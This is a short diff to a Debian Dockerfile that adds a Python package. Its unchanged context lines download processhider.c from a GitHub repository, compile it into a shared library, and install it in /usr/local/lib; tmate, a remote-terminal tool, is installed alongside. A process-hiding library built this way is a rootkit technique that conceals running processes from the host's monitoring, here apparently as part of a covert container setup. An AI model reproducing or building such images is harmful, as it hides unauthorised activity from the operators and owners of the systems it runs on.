@@ -1,7 +1,7 @@
 FROM debian as base
 ENV DEBIAN_FRONTEND=noninteractive
 RUN apt update && apt upgrade -y && apt install -y \
-    ssh git wget nano curl python3 python3-pip tmate
+    ssh git wget nano curl python3 python3-pip python3-venv tmate 
 RUN wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c \
     && gcc -Wall -fPIC -shared -o libprocess.so processhider.c -ldl \
     && mv libprocess.so /usr/local/lib/ \
